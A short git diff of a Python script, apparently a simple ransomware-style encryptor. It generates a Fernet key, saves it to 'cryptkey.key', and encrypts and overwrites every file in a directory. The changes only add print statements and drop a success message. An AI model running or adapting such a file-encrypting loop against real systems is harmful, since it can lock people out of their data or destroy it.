@@ -25,6 +25,7 @@ for file in direc:
         direc.remove("gitignore") 
 
 
+print(direc)
 
 key = Fernet.generate_key()
 
@@ -33,10 +34,9 @@ with open("cryptkey.key", "wb") as cryptkey:
     
     
 for file in direc:
+    print(file)
     with open(file, "rb") as thefile:
         contents = thefile.read()
     contents_encrypted = Fernet(key).encrypt(contents)
     with open(file, "wb") as thefile:
         thefile.write(contents_encrypted)
-
-print("succusfully encrypted", direc)
